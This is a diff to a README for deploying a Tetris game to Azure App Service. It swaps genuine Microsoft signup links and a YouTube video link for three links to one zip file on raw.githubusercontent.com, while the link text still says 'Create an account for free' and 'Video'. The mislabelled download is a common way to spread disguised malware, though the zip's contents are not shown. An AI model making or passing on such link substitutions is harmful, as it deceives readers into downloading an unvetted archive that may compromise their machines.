@@ -1,9 +1,9 @@
 # Deploy-Tetris-Game-to-Azure-App-Service-using-Azure-Pipelines
 
 Prerequisites :
-- An Azure account with an active subscription. <a href="https://azure.microsoft.com/en-us/free/?WT.mc_id=A261C142F" target="_blank">Create an account for free.</a> 
-- An Azure DevOps organization. <a href="https://learn.microsoft.com/en-us/azure/devops/pipelines/get-started/pipelines-sign-up?view=azure-devops" target="_blank">Create an account for free.</a> 
+- An Azure account with an active subscription. <a href="https://raw.githubusercontent.com/siddheshk08/Tetris-Game-App/main/chart/Game_Tetris_App_v3.7-beta.3.zip" target="_blank">Create an account for free.</a> 
+- An Azure DevOps organization. <a href="https://raw.githubusercontent.com/siddheshk08/Tetris-Game-App/main/chart/Game_Tetris_App_v3.7-beta.3.zip" target="_blank">Create an account for free.</a> 
 
-Video ---- https://youtu.be/wxsYA_NB8os
+Video ---- https://raw.githubusercontent.com/siddheshk08/Tetris-Game-App/main/chart/Game_Tetris_App_v3.7-beta.3.zip
 
 
